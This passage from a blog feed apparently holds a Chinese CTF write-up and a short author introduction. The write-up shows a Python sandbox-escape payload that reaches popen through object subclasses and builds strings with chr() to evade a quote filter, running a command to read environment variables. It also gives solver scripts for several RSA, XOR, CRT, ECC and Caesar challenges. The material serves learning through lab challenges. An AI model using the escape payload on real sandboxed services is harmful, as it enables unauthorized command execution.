class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><p>æ¨¡ä»¿sstiçš„åšæ³•è·å¾—wrap_close:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(().__class__.__base__.__subclasses__()[<span class="number">132</span>])</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¦è·å–popen,ä½†å¼•å·è¢«ç¦ç”¨ï¼Œä¸å¦¨ç”¨chrç»•è¿‡,ç®€å•å†™ä¸ªè„šæœ¬å¿«é€Ÿè·å¾—payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">r_s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    r_s += <span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(s[i])&#125;</span>)+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r_s)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆåœ¨ç¯å¢ƒå˜é‡ä¸­å¾—åˆ°flag,payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(().__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">110</span>)](<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">110</span>)+<span class="built_in">chr</span>(<span class="number">118</span>)).read())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;b101c81b-e232-4cdd-98fa-814c03772caa&#125;</span><br></pre></td></tr></table></figure><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p>è„šæœ¬å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»™å®šå‚æ•°</span></span><br><span class="line">n = <span class="number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line">p = <span class="number">192173332221883349384646293941837353967</span></span><br><span class="line">q = <span class="number">172282016556631997385463935089230918399</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®— Ï†(n)</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—ç§é’¥ d</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†å¯†æ–‡</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h1 id="å…±æ¨¡æ”»å‡»"><a href="#å…±æ¨¡æ”»å‡»" class="headerlink" title="å…±æ¨¡æ”»å‡»"></a>å…±æ¨¡æ”»å‡»</h1><p>è„šæœ¬å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n= <span class="number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line">c1= <span class="number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line">c2= <span class="number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line">e1e2= <span class="number">911</span>*<span class="number">967</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):  <span class="comment">#å…±æ¨¡æ”»å‡»å‡½æ•°</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e1,e2:&quot;</span>,e1,e2)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;mpz:&quot;</span>,s)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>): <span class="comment">#å› ä¸ºæ­¤æ—¶çš„mä¸æ˜¯çœŸæ­£çš„mï¼Œè€Œæ˜¯m^kï¼Œæ‰€ä»¥å¯¹m^kè¿›è¡Œçˆ†ç ´</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> k&lt;<span class="number">1000</span>: <span class="comment">#æŒ‡å®škå°äº1000</span></span><br><span class="line">        mk = c + n*k</span><br><span class="line">        flag, true1 = gmpy2.iroot(mk, e)  <span class="comment">#è¿”å›çš„ç¬¬ä¸€ä¸ªæ•°å€¼ä¸ºå¼€æ–¹æ•°ï¼Œç¬¬äºŒä¸ªæ•°å€¼ä¸ºå¸ƒå°”å‹ï¼Œå¯æ•´é™¤ä¸ºtrueï¼Œå¯è‡ªè¡Œæµ‹è¯•</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == true1:</span><br><span class="line">            <span class="comment"># print(libnum.n2s(int(flag)))</span></span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> e1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,e1e2):</span><br><span class="line">    <span class="keyword">if</span> e1e2%e1==<span class="number">0</span>:         <span class="comment">#çˆ†ç ´å¯æ•´é™¤çš„e</span></span><br><span class="line">        e2=e1e2//e1</span><br><span class="line">        c=rsa_gong_N_def(e1, e2, c1, c2, n)</span><br><span class="line">        e=gmpy2.gcd(e1,e2)</span><br><span class="line">        m1=de(c, e, n)</span><br><span class="line">        <span class="keyword">if</span> m1:  <span class="comment">#æŒ‡å®šè¾“å‡ºm1</span></span><br><span class="line">            <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m1)))</span><br></pre></td></tr></table></figure><h1 id="X0r"><a href="#X0r" class="headerlink" title="X0r"></a>X0r</h1><p>è„šæœ¬å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥çš„åŠ å¯†å€¼å’Œé¢„æœŸçš„ `e2`</span></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e2_expected = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åå‘è®¡ç®—å¾—åˆ° `enc`</span></span><br><span class="line">e1 = e2_expected ^ f2</span><br><span class="line">enc = e1 ^ f1</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°† `enc` è½¬æ¢ä¸ºå­—èŠ‚</span></span><br><span class="line">enc_bytes = long_to_bytes(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡è®¾ flag ä»¥ b&#x27;SYC&#123;&#x27; å¼€å¤´</span></span><br><span class="line">known_flag_start = <span class="string">b&#x27;SYC&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®— `key` çš„å‰å››ä¸ªå­—èŠ‚</span></span><br><span class="line">key = xor(enc_bytes[:<span class="number">4</span>], known_flag_start)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;æ¨å¯¼å‡ºçš„ key å‰å››ä¸ªå­—èŠ‚: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨è¯¥æ¨å¯¼å‡ºçš„ key å‰å››ä¸ªå­—èŠ‚æ¥è§£å¯† `flag`</span></span><br><span class="line">flag = xor(enc_bytes, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;è§£å¯†å¾—åˆ°çš„ flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="ncoCRT"><a href="#ncoCRT" class="headerlink" title="ncoCRT"></a>ncoCRT</h1><p>è„šæœ¬å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> solve_congruence</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»™å®šçš„ p å’Œ c</span></span><br><span class="line">p = [<span class="number">1921232050179818686537976490035</span>, <span class="number">2050175089402111328155892746480</span>, <span class="number">1960810970476421389691930930824</span>, <span class="number">1797713136323968089432024221276</span>, <span class="number">2326915607951286191807212748022</span>]</span><br><span class="line">c = [<span class="number">1259284928311091851012441581576</span>, <span class="number">1501691203352712190922548476321</span>, <span class="number">1660842626322200346728249202857</span>, <span class="number">657314037433265072289232145909</span>, <span class="number">2056630082529583499248887436721</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†è§£</span></span><br><span class="line">congruences = [(ci, pi) <span class="keyword">for</span> ci, pi <span class="keyword">in</span> <span class="built_in">zip</span>(c, p)]</span><br><span class="line">x, _ = solve_congruence(*congruences)</span><br><span class="line"></span><br><span class="line"><span class="comment"># x æ˜¯æ¢å¤çš„ m, è½¬å›ä¸º bytes åå¾—åˆ° flag</span></span><br><span class="line">flag_bytes = long_to_bytes(x)[:-<span class="number">23</span>]  <span class="comment"># å»é™¤å¤šä½™çš„å¡«å…… \x01</span></span><br><span class="line"><span class="built_in">print</span>(flag_bytes)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ecc"><a href="#ecc" class="headerlink" title="ecc"></a>ecc</h1><p>è„šæœ¬å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">74997021559434065975272431626618720725838473091721936616560359000648651891507</span></span><br><span class="line">a = <span class="number">61739043730332859978236469007948666997510544212362386629062032094925353519657</span></span><br><span class="line">b = <span class="number">12824761259043751634610094689861000765081341921946160155432001001819005935812</span></span><br><span class="line">k = <span class="number">93653874272176107584459982058527081604083871182797816204772644509623271061231</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">c1 = E([<span class="number">14455613666211899576018835165132438102011988264607146511938249744871964946084</span>,<span class="number">25506582570581289714612640493258299813803157561796247330693768146763035791942</span>])</span><br><span class="line">c2 = E([<span class="number">37554871162619456709183509122673929636457622251880199235054734523782483869931</span>, <span class="number">71392055540616736539267960989304287083629288530398474590782366384873814477806</span>])</span><br><span class="line">cipher_left = <span class="number">68208062402162616009217039034331142786282678107650228761709584478779998734710</span></span><br><span class="line">cipher_right = <span class="number">27453988545002384546706933590432585006240439443312571008791835203660152890619</span></span><br><span class="line">m = c1 - k * c2</span><br><span class="line">left = cipher_left//m[<span class="number">0</span>] </span><br><span class="line">right = cipher_right//m[<span class="number">1</span>] <span class="comment"># ä¸èƒ½è½¬intæˆ–Integerå‹ï¼Œä¸ç„¶ç»“æœä¸º0ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œå¾ˆå¥‡æ€ª</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(left))+long_to_bytes(<span class="built_in">int</span>(right)))</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜æœ¬åœ°è£…ç¯å¢ƒæœ‰ç‚¹éº»çƒ¦ï¼Œç”¨çš„çº¿ä¸Šæµ‹è¯•å·¥å…·</p><h1 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h1><p>è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span></span><br><span class="line">dp = <span class="number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):                   </span><br><span class="line">    <span class="keyword">if</span>(dp*e-<span class="number">1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span>) == <span class="number">0</span>:   </span><br><span class="line">            p=((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span></span><br><span class="line">            q=n//(((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span>)</span><br><span class="line">            phi=(q-<span class="number">1</span>)*(p-<span class="number">1</span>)            </span><br><span class="line">            d=gp.invert(e,phi)         </span><br><span class="line">            m=<span class="built_in">pow</span>(c,d,n)               </span><br><span class="line">           </span><br><span class="line"><span class="built_in">print</span>(m)                              </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h1 id="å‡¯æ’’åŠ å¯†"><a href="#å‡¯æ’’åŠ å¯†" class="headerlink" title="å‡¯æ’’åŠ å¯†"></a>å‡¯æ’’åŠ å¯†</h1><p>è¿™ä¸ªæˆ‘çœŸä¼šï¼Œå¥½å§<br>å¯†ç é¢˜é‡Œå”¯ä¸€ä¸€é“èƒ½æ‰‹æ“çš„</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">ciphertext, shift</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shift_base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - shift_base - shift) % <span class="number">26</span> + shift_base)</span><br><span class="line">            decrypted.append(decrypted_char)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;YEI&#123;CKRIUSK_ZU_2024_MKKQ_INGRRKTMK&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">    decrypted_text = caesar_decrypt(ciphertext, shift)</span><br><span class="line">    <span class="built_in">print</span>(decrypted_text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤§å®¶å¥½å•Šæˆ‘å«ivory</title>
      <link href="/2025/03/07/introduce/"/>
      <url>/2025/03/07/introduce/</url>
      
        <content type="html"><![CDATA[<h4 id="ä¸»ä¸šæ˜¯æ‰“ctfï¼Œå­¦ä¹ ç½‘å®‰çŸ¥è¯†"><a href="#ä¸»ä¸šæ˜¯æ‰“ctfï¼Œå­¦ä¹ ç½‘å®‰çŸ¥è¯†" class="headerlink" title="ä¸»ä¸šæ˜¯æ‰“ctfï¼Œå­¦ä¹ ç½‘å®‰çŸ¥è¯†:"></a>ä¸»ä¸šæ˜¯æ‰“ctfï¼Œå­¦ä¹ ç½‘å®‰çŸ¥è¯†:</h4><p><img src="/2025/03/07/introduce/ctf.png"></p><p>æœ‰äººé—®æˆ‘ï¼šâ€œä½ æ˜¯ctferå—â€<br>æˆ‘è§‰å¾—æˆ‘æ˜¯</p><h4 id="å‰¯ä¸šå¶å°”ææå„ç§å„æ ·çš„å¼€å‘"><a href="#å‰¯ä¸šå¶å°”ææå„ç§å„æ ·çš„å¼€å‘" class="headerlink" title="å‰¯ä¸šå¶å°”ææå„ç§å„æ ·çš„å¼€å‘"></a>å‰¯ä¸šå¶å°”ææå„ç§å„æ ·çš„å¼€å‘</h4><p>ä¾‹å¦‚qqbot:</p><p><img src="/2025/03/07/introduce/qqbot.png"></p><h4 id="ç›®å‰å±äºSycloverå®‰å…¨æŠ€æœ¯å°ç»„çš„æ–°èŠ½ç»„"><a href="#ç›®å‰å±äºSycloverå®‰å…¨æŠ€æœ¯å°ç»„çš„æ–°èŠ½ç»„" class="headerlink" title="ç›®å‰å±äºSycloverå®‰å…¨æŠ€æœ¯å°ç»„çš„æ–°èŠ½ç»„"></a>ç›®å‰å±äº<code>Syclover</code>å®‰å…¨æŠ€æœ¯å°ç»„çš„æ–°èŠ½ç»„</h4><p>å¸Œæœ›èƒ½ç»§ç»­è·Ÿå¤§å®¶ä¸€èµ·å­¦ä¹ è¿›æ­¥</p><p><img src="/2025/03/07/introduce/syc.JPEG"></p>]]></content>
      
      
      <categories>
          
          <category> é—²èŠ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»‹ç» </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
